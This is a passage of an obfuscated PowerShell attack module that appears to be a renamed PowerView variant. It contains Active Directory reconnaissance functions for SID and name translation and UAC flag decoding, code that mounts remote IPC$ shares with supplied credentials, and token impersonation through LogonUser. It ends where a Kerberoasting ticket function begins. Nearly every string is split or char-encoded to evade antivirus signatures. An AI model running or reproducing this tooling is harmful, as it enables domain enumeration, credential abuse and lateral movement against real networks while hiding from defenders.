                    $UserDomain = $DN.SubString($DN.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments[('Ident'+'i'+'ty')] = $UserName
                    $DomainSearcherArguments[('Dom'+'ain')] = $UserDomain
                    $DomainSearcherArguments[('Pr'+'opert'+'ies')] = ('objec'+'t'+'s'+'id')
                    &('G'+'et-DomainObje'+'ct') @DomainSearcherArguments | &('Select-O'+'b'+'jec'+'t') -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[('D'+'omai'+'n')]) {
                        $DomainSearcherArguments = @{}
                        $Domain = (&('Ge'+'t'+'-'+'Domain') @DomainSearcherArguments).Name
                    }

                    $Obj = (&('N'+'e'+'w-Objec'+'t') System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    &('W'+'r'+'ite-Verbos'+'e') ('[Co'+'nvert'+'To-SID] '+'Err'+'or '+'con'+'vert'+'in'+'g '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function ConvertFrom-SID {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('S'+'ID'))]
        [ValidatePattern(('^S-1-'+'.*'))]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'omainCont'+'rol'+'ler'))]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters[('Do'+'main')]) { $ADNameArguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('Serv'+'er')]) { $ADNameArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('Cre'+'dent'+'ia'+'l')]) { $ADNameArguments[('C'+'redentia'+'l')] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                Switch ($TargetSid) {
                    ('S-1-'+'0')         { ('Null'+' A'+'utho'+'rity') }
                    ('S-1-'+'0-0')       { ('Nobo'+'dy') }
                    ('S'+'-1-1')         { ('Wor'+'ld Autho'+'rity') }
                    ('S-1-'+'1-0')       { ('Eve'+'ryon'+'e') }
                    ('S-'+'1-2')         { ('Local A'+'uthor'+'it'+'y') }
                    ('S-'+'1-2'+'-0')       { ('Loc'+'al') }
                    ('S-1'+'-2-'+'1')       { ('Co'+'nsole Log'+'on ') }
                    ('S-1'+'-3')         { ('Cr'+'e'+'at'+'or Authori'+'ty') }
                    ('S'+'-1'+'-3-0')       { ('C'+'rea'+'tor Ow'+'ner') }
                    ('S-1-'+'3-1')       { ('Crea'+'tor '+'Grou'+'p') }
                    ('S-1-3-'+'2')       { ('Cr'+'eato'+'r'+' Owner '+'Server') }
                    ('S-'+'1-3-3')       { ('Creator G'+'r'+'oup '+'S'+'er'+'ver') }
                    ('S'+'-1'+'-3-4')       { ('Owner R'+'i'+'g'+'hts') }
                    ('S-'+'1-4')         { ('Non-u'+'nique '+'A'+'uthori'+'t'+'y') }
                    ('S'+'-1-5')         { ('NT A'+'ut'+'hor'+'ity') }
                    ('S-1-'+'5'+'-1')       { ('Dia'+'lup') }
                    ('S-1-'+'5-2')       { ('Ne'+'twork') }
                    ('S-'+'1-'+'5-3')       { ('Ba'+'tch') }
                    ('S-'+'1'+'-5-4')       { ('Inte'+'ract'+'ive') }
                    ('S-1-5-'+'6')       { ('Ser'+'vic'+'e') }
                    ('S'+'-1-5'+'-7')       { ('Anon'+'ym'+'ous') }
                    ('S-1'+'-'+'5-8')       { ('P'+'roxy') }
                    ('S-1-'+'5'+'-9')       { ('Ente'+'r'+'pri'+'s'+'e '+'Domain Control'+'le'+'rs') }
                    ('S-1'+'-5-'+'10')      { ('Princip'+'a'+'l'+' '+'Self') }
                    ('S-1-5-'+'11')      { ('Au'+'the'+'nt'+'icat'+'ed '+'Users') }
                    ('S-1-5'+'-'+'12')      { ('R'+'estri'+'cte'+'d Code') }
                    ('S-'+'1-'+'5-13')      { ('Te'+'r'+'mi'+'nal'+' Server U'+'ser'+'s') }
                    ('S-'+'1-5-'+'14')      { ('Re'+'mote Interac'+'tiv'+'e '+'Logon') }
                    ('S-'+'1-5-'+'15')      { ('Th'+'is'+' '+'Organizat'+'ion ') }
                    ('S'+'-'+'1-5-17')      { ('T'+'his '+'Organ'+'izat'+'ion ') }
                    ('S-1-'+'5-18')      { ('Local'+' Sys'+'tem') }
                    ('S-1-'+'5'+'-19')      { ('NT Autho'+'rit'+'y') }
                    ('S-1-5-'+'2'+'0')      { ('NT'+' Aut'+'horit'+'y') }
                    ('S-1-'+'5-8'+'0-0')    { ('All Se'+'r'+'v'+'ices ') }
                    ('S'+'-1-5-32'+'-544')  { (('BUI'+'LTIN70MAdmin'+'i'+'s'+'trator'+'s').RePLace(([cHAr]55+[cHAr]48+[cHAr]77),'\')) }
                    ('S-'+'1-5'+'-32-54'+'5')  { (('B'+'UI'+'LTI'+'N{0}Users') -f [Char]92) }
                    ('S-1-5-3'+'2'+'-546')  { (('BUILT'+'I'+'N'+'FXhGues'+'ts').replace(([cHAr]70+[cHAr]88+[cHAr]104),[StriNG][cHAr]92)) }
                    ('S-1'+'-5-3'+'2'+'-547')  { (('BUI'+'LTI'+'N{0}Po'+'we'+'r U'+'sers')-F  [cHar]92) }
                    ('S-1-5-'+'3'+'2-548')  { (('B'+'UI'+'LTI'+'NT3c'+'Account Ope'+'rator'+'s').REplAcE('T3c',[STRinG][Char]92)) }
                    ('S'+'-1-5-32-'+'5'+'49')  { (('BU'+'IL'+'T'+'IN6N'+'DServer '+'Operat'+'o'+'rs')-CRePlAce  '6ND',[Char]92) }
                    ('S-1'+'-5-32'+'-'+'550')  { (('BUI'+'LTINgUBPri'+'nt '+'O'+'pe'+'ra'+'to'+'rs') -ReplacE 'gUB',[ChAr]92) }
                    ('S-1-5'+'-32-'+'55'+'1')  { (('BU'+'ILT'+'IN'+'J8FBackup Ope'+'ra'+'tors') -REPLAcE'J8F',[chaR]92) }
                    ('S-1'+'-5-32-55'+'2')  { (('BUIL'+'TI'+'N{0'+'}Rep'+'licat'+'ors')-f  [cHaR]92) }
                    ('S-1-5-3'+'2-'+'554')  { (('B'+'U'+'ILTIN{0}Pre'+'-W'+'in'+'do'+'ws 2000 Com'+'patible Access')  -F[chaR]92) }
                    ('S-1'+'-'+'5-32-55'+'5')  { (('BU'+'ILTIN'+'QTuRemote '+'Desktop U'+'ser'+'s').RepLaCe('QTu','\')) }
                    ('S-1-'+'5-32-5'+'5'+'6')  { (('B'+'UILTINWrRNet'+'work'+' Confi'+'g'+'uration Op'+'erators').rePLAcE('WrR',[sTrInG][ChaR]92)) }
                    ('S'+'-1'+'-5-32-'+'557')  { (('BUIL'+'T'+'IN8IYIncoming '+'F'+'orest Trust '+'Builders')  -CrePlAcE ([char]56+[char]73+[char]89),[char]92) }
                    ('S-'+'1-5-'+'32-5'+'58')  { (('BUI'+'L'+'TIN5n'+'RPerform'+'an'+'c'+'e'+' Monito'+'r '+'Users')-CRepLaCe  ([chAR]53+[chAR]110+[chAR]82),[chAR]92) }
                    ('S-1'+'-5-'+'32-559')  { (('BUILTIN{'+'0}'+'P'+'erfo'+'rmance Log '+'U'+'s'+'ers')  -f  [chaR]92) }
                    ('S'+'-1'+'-5-3'+'2-560')  { (('BUI'+'LT'+'IN'+'{0}W'+'indows Author'+'i'+'zati'+'o'+'n'+' '+'Ac'+'cess'+' Group')-F [cHaR]92) }
                    ('S-1'+'-'+'5-32-5'+'61')  { (('BUI'+'L'+'TIN{0'+'}Te'+'rmina'+'l'+' Serv'+'er Lice'+'nse '+'Se'+'rvers')-f[cHaR]92) }
                    ('S'+'-1-'+'5'+'-32-562')  { (('B'+'UILTI'+'N'+'{'+'0'+'}Distr'+'ib'+'u'+'ted COM User'+'s') -f  [ChAR]92) }
                    ('S-'+'1'+'-5-32-'+'569')  { (('BUIL'+'TINU1YCry'+'p'+'tograp'+'hi'+'c Oper'+'ator'+'s').REPLAcE(([cHAr]85+[cHAr]49+[cHAr]89),'\')) }
                    ('S'+'-'+'1-5-32-5'+'73')  { (('BUILT'+'IN{0'+'}Event L'+'og Reade'+'rs') -f  [CHar]92) }
                    ('S-1'+'-5-'+'32'+'-574')  { (('B'+'U'+'ILTINWX'+'vCe'+'rtific'+'ate '+'Ser'+'vi'+'ce DCOM '+'A'+'cce'+'ss') -rEplaCE ([Char]87+[Char]88+[Char]118),[Char]92) }
                    ('S-1-5-32'+'-'+'575')  { (('BUI'+'L'+'TI'+'NVRBRDS R'+'emo'+'te Access'+' '+'S'+'erve'+'rs')-CREPlaCE'VRB',[CHaR]92) }
                    ('S-1-'+'5-3'+'2-'+'576')  { (('B'+'U'+'IL'+'TIN'+'X5qRDS En'+'dp'+'oint'+' Se'+'rvers')-CrePLaCe  ([chAr]88+[chAr]53+[chAr]113),[chAr]92) }
                    ('S'+'-1-5-32'+'-5'+'77')  { (('BUILTIN9V'+'NRDS'+' M'+'a'+'nag'+'eme'+'nt '+'S'+'e'+'r'+'vers')-CRepLAce  ([char]57+[char]86+[char]78),[char]92) }
                    ('S-'+'1-'+'5-32-578')  { (('B'+'UILTIN'+'1TU'+'Hyp'+'er'+'-V Adminis'+'tra'+'to'+'rs').rEPLacE(([CHaR]49+[CHaR]84+[CHaR]85),'\')) }
                    ('S-1-'+'5-32-'+'5'+'79')  { (('BUILT'+'INi'+'Z1'+'A'+'ccess Cont'+'rol A'+'ssistance O'+'pera'+'to'+'rs').REplace('iZ1',[strIng][cHaR]92)) }
                    ('S'+'-1-5-32-5'+'80')  { (('BU'+'ILT'+'I'+'N{0}Acce'+'ss Contro'+'l Assist'+'a'+'nce'+' Op'+'er'+'ators')  -f[char]92) }
                    Default {
                        &('Co'+'nvert'+'-ADNam'+'e') -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                &('Write-Ve'+'rbos'+'e') ('[C'+'onvertFrom-S'+'I'+'D] '+'Err'+'or '+'converti'+'ng'+' '+'S'+'ID '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function Convert-ADName {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUseS'+'houl'+'d'+'Pr'+'oc'+'es'+'s'+'For'+'StateCha'+'ngi'+'n'+'gFunctions'), '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Nam'+'e'), ('Ob'+'jec'+'tName'))]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', ('Ca'+'nonica'+'l'), ('NT'+'4'), ('Disp'+'lay'), ('D'+'oma'+'i'+'nSimple'), ('E'+'nterpr'+'is'+'eSimple'), ('GUI'+'D'), ('Unk'+'n'+'own'), ('UP'+'N'), ('Canon'+'ic'+'a'+'lEx'), ('SP'+'N'))]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ainContr'+'ol'+'ler'))]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            ('Can'+'oni'+'cal')         =   2  # fabrikam.com/Engineers/Phineas Flynn
            ('NT'+'4')               =   3  # fabrikam\pflynn
            ('D'+'i'+'splay')           =   4  # pflynn
            ('Domai'+'nSimp'+'le')      =   5  # pflynn@fabrikam.com
            ('Enterpri'+'se'+'Simp'+'le')  =   6  # pflynn@fabrikam.com
            ('G'+'UID')              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            ('Unkno'+'w'+'n')           =   8  # unknown type - let the server do translation
            ('U'+'PN')               =   9  # pflynn@fabrikam.com
            ('Cano'+'nica'+'lE'+'x')       =   10 # fabrikam.com/Users/Phineas Flynn
            ('SP'+'N')               =   11 # HTTP/kairomac.contoso.com
            ('S'+'ID')               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, ('In'+'voke'+'Method'), $NULL, $Object, $Parameters)
            &('Writ'+'e-Out'+'pu'+'t') $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, ('Ge'+'t'+'Property'), $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, ('SetP'+'rope'+'rty'), $NULL, $Object, $Parameters)
        }

        if ($PSBoundParameters[('S'+'er'+'ver')]) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters[('Doma'+'i'+'n')]) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters[('Cr'+'ede'+'ntial')]) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters[('Ou'+'t'+'putType')]) {
                if ($TargetIdentity -match (('^[A'+'-Za-z]+{0'+'}{0}'+'[A-Za'+'-z ]+')-f  [ChaR]92)) {
                    $ADSOutputType = $NameTypes[('D'+'omai'+'nSi'+'mple')]
                }
                else {
                    $ADSOutputType = $NameTypes[('N'+'T4')]
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = &('New-Ob'+'j'+'ect') -ComObject NameTranslate

            if ($PSBoundParameters[('Crede'+'n'+'t'+'ial')]) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    &('In'+'v'+'oke-Me'+'thod') $Translate ('In'+'itEx') (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    &('Wri'+'te-Verb'+'o'+'se') ('[Conver'+'t'+'-AD'+'Name] '+'E'+'rr'+'or '+'in'+'iti'+'aliz'+'i'+'ng '+'t'+'r'+'anslation '+'f'+'or '+"'$Identity' "+'u'+'sin'+'g '+'alter'+'na'+'te'+' '+'c'+'re'+'dent'+'ials '+': '+"$_")
                }
            }
            else {
                try {
                    $Null = &('In'+'v'+'oke-Method') $Translate ('I'+'nit') (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    &('Wr'+'ite-V'+'erbo'+'s'+'e') ('[C'+'on'+'ver'+'t-A'+'DN'+'ame] '+'Err'+'or'+' '+'initi'+'aliz'+'ing '+'translat'+'i'+'on'+' '+'f'+'or '+"'$Identity' "+': '+"$_")
                }
            }

            &('Set-Pro'+'pe'+'rty') $Translate ('ChaseRe'+'fer'+'r'+'al') (0x60)

            try {
                $Null = &('I'+'n'+'voke-'+'Method') $Translate ('S'+'et') (8, $TargetIdentity)
                &('In'+'voke-Metho'+'d') $Translate ('G'+'et') ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &('W'+'ri'+'t'+'e-V'+'erbose') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function ConvertFrom-UACValue {


    [OutputType(('S'+'ystem.Collec'+'t'+'ions.'+'Sp'+'eciali'+'ze'+'d.Orde'+'redDic'+'ti'+'onary'))]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('U'+'AC'), ('user'+'ac'+'co'+'unt'+'con'+'trol'))]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        $UACValues = &('Ne'+'w-Objec'+'t') System.Collections.Specialized.OrderedDictionary
        $UACValues.Add(('SC'+'RI'+'PT'), 1)
        $UACValues.Add(('ACCOUNT'+'D'+'ISA'+'BL'+'E'), 2)
        $UACValues.Add(('HOMEDIR_REQUI'+'R'+'E'+'D'), 8)
        $UACValues.Add(('LOCKOU'+'T'), 16)
        $UACValues.Add(('PASSW'+'D_N'+'OTR'+'E'+'QD'), 32)
        $UACValues.Add(('PASSW'+'D_C'+'AN'+'T_CHA'+'NGE'), 64)
        $UACValues.Add(('ENC'+'RYPT'+'E'+'D_'+'T'+'EXT_PWD_AL'+'LOWE'+'D'), 128)
        $UACValues.Add(('TEMP_DUPLIC'+'A'+'TE_A'+'C'+'COUNT'), 256)
        $UACValues.Add(('N'+'O'+'RMAL_ACCO'+'UNT'), 512)
        $UACValues.Add(('INTE'+'RDOMA'+'IN_'+'TRUST_'+'ACC'+'OUNT'), 2048)
        $UACValues.Add(('W'+'ORKST'+'A'+'TION_'+'TRUST'+'_ACCOUNT'), 4096)
        $UACValues.Add(('SER'+'VER_TRUST_AC'+'CO'+'UNT'), 8192)
        $UACValues.Add(('DON'+'T_E'+'XPI'+'R'+'E_PA'+'SSWORD'), 65536)
        $UACValues.Add(('M'+'N'+'S_LO'+'G'+'ON_ACCOUNT'), 131072)
        $UACValues.Add(('SMARTCA'+'RD_'+'REQ'+'UI'+'R'+'ED'), 262144)
        $UACValues.Add(('T'+'RUS'+'TED_FOR_DELEGA'+'T'+'ION'), 524288)
        $UACValues.Add(('NOT'+'_DELEGAT'+'ED'), 1048576)
        $UACValues.Add(('USE_'+'DES_KEY_ON'+'LY'), 2097152)
        $UACValues.Add(('DON'+'T'+'_'+'REQ'+'_PREAUTH'), 4194304)
        $UACValues.Add(('PASSW'+'ORD_EXPIR'+'ED'), 8388608)
        $UACValues.Add(('TRU'+'S'+'TED'+'_T'+'O_AUTH_'+'FOR_'+'DEL'+'EGATION'), 16777216)
        $UACValues.Add(('PARTIA'+'L_'+'SE'+'CRETS_'+'ACCOUNT'), 67108864)
    }

    PROCESS {
        $ResultUACValues = &('New-Obj'+'ec'+'t') System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShouldP'+'r'+'oce'+'ss'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias(('GroupN'+'a'+'me'), ('Gr'+'o'+'upIdenti'+'t'+'y'))]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    &('A'+'dd'+'-Type') -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters[('Doma'+'i'+'n')] -or ($Identity -match (('.+'+'e'+'Nv'+'eNv.+').rePlaCE(([CHar]101+[CHar]78+[CHar]118),[stRinG][CHar]92)))) {
            if ($Identity -match (('.+{0}{'+'0}.+')-f[cHar]92)) {
                $ConvertedIdentity = $Identity | &('C'+'o'+'n'+'vert-'+'ADName') -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    &('W'+'r'+'ite'+'-'+'Verbose') ('[Get'+'-Princi'+'pa'+'lContex'+'t]'+' '+'Bindin'+'g '+'t'+'o '+'domai'+'n '+"'$ConnectTarget'")
                }
            }
            else {
                $ObjectIdentity = $Identity
                &('Write-'+'Verb'+'ose') ('[Get-Princ'+'ipalConte'+'xt'+']'+' '+'B'+'in'+'ding '+'to'+' '+'domai'+'n '+"'$Domain'")
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters[('Cred'+'entia'+'l')]) {
                &('Writ'+'e-V'+'erbos'+'e') ('[Ge'+'t-'+'Princip'+'alContext'+'] Using al'+'te'+'rna'+'t'+'e '+'c'+'redent'+'i'+'als')
                $Context = &('Ne'+'w'+'-Ob'+'ject') -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = &('Ne'+'w-'+'O'+'bject') -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters[('C'+'r'+'ed'+'ential')]) {
                &('Wri'+'te-'+'Ve'+'rbose') ('[G'+'et-Pri'+'nci'+'pa'+'lCo'+'nte'+'xt'+']'+' Usi'+'ng alternate '+'credentials')
                $DomainName = &('G'+'et-'+'Domain') | &('Sele'+'ct-'+'Object') -ExpandProperty Name
                $Context = &('N'+'ew-Obj'+'ect') -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = &('N'+'ew'+'-O'+'bject') -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = &('New-'+'O'+'b'+'ject') PSObject
        $Out | &('Add-Mem'+'be'+'r') Noteproperty ('Con'+'te'+'xt') $Context
        $Out | &('Add'+'-M'+'ember') Noteproperty ('Identi'+'ty') $ObjectIdentity
        $Out
    }
    catch {
        &('Write'+'-W'+'ar'+'ning') ('[Ge'+'t-Princ'+'ipalCo'+'ntext'+'] '+'Error'+' '+'crea'+'ti'+'ng '+'bi'+'ndi'+'ng '+'fo'+'r '+'ob'+'ject'+' '+"('$Identity') "+'con'+'tex'+'t '+': '+"$_")
    }
}


function Add-RemoteConnection {


    [CmdletBinding(DefaultParameterSetName = {'Compute'+'rN'+'am'+'e'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "COMp`UTER`NA`mE", ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Ho'+'s'+'tName'), ('dnsho'+'st'+'name'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = "pa`TH", Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[('Co'+'mpute'+'rName')]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            &('Write'+'-'+'Verb'+'os'+'e') ('['+'Add-Remote'+'C'+'onnect'+'i'+'on'+'] '+'A'+'ttempt'+'in'+'g '+'to'+' '+'mount'+': '+"$TargetPath")

            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                &('Wri'+'te-Verbo'+'se') ("$TargetPath "+'succes'+'sfu'+'l'+'l'+'y '+'m'+'ount'+'ed')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function Remove-RemoteConnection {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUs'+'eS'+'h'+'o'+'ul'+'dProc'+'e'+'s'+'sF'+'o'+'rStateChanging'+'Functions'), '')]
    [CmdletBinding(DefaultParameterSetName = {'Co'+'mpute'+'r'+'Name'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "COM`pUterN`AME", ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Ho'+'stNa'+'me'), ('dns'+'hostn'+'am'+'e'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = "P`ATH", Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[('Compu'+'terN'+'a'+'me')]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            &('W'+'rite-Ver'+'bose') ('[R'+'emove-Remot'+'eConn'+'ection]'+' '+'Atte'+'m'+'pting '+'t'+'o '+'un'+'m'+'ount: '+"$TargetPath")
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                &('Write-V'+'e'+'rbo'+'se') ("$TargetPath "+'succ'+'es'+'s'+'fu'+'lly '+'umm'+'ou'+'nted')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function Invoke-UserImpersonation {


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = {'C'+'redent'+'ial'})]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = "CredeN`T`IAL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = "tO`KEN`HAndLe")]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne ('S'+'TA')) -and (-not $PSBoundParameters[('Qui'+'et')])) {
        &('Write-Wa'+'rnin'+'g') ('[I'+'nvok'+'e-Us'+'e'+'rI'+'mpersona'+'tion] power'+'shell.'+'exe is'+' not cu'+'rr'+'ently i'+'n a sin'+'gle-th'+'read'+'e'+'d apartment '+'stat'+'e'+', token'+' imp'+'er'+'son'+'ati'+'o'+'n may not '+'work.')
    }

    if ($PSBoundParameters[('Tok'+'enHan'+'dle')]) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        &('Writ'+'e-Warn'+'in'+'g') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &('W'+'ri'+'te'+'-Ve'+'rbose') ('['+'Invoke'+'-UserIm'+'p'+'e'+'rso'+'nation]'+' '+'Altern'+'ate c'+'rede'+'n'+'tials s'+'uccessfu'+'l'+'ly im'+'pers'+'onate'+'d')
    $LogonTokenHandle
}


function Invoke-RevertToSelf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters[('Tok'+'enHand'+'le')]) {
        &('Wri'+'te-War'+'ning') ('[I'+'nvoke'+'-RevertToSelf] Revert'+'ing t'+'oken impe'+'rsona'+'t'+'ion an'+'d'+' clos'+'in'+'g LogonUs'+'e'+'r() token '+'handle')
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &('Write'+'-'+'Verbos'+'e') ('[In'+'voke-'+'Rever'+'tToSel'+'f] '+'Toke'+'n im'+'pe'+'r'+'son'+'atio'+'n s'+'uc'+'cessfully reve'+'rte'+'d')
}


function Get-DomainSPNTicket {


    [OutputType(('Po'+'wer'+'Bla.'+'SP'+'NTicket'))]
    [CmdletBinding(DefaultParameterSetName = {'R'+'awSPN'})]
    Param (
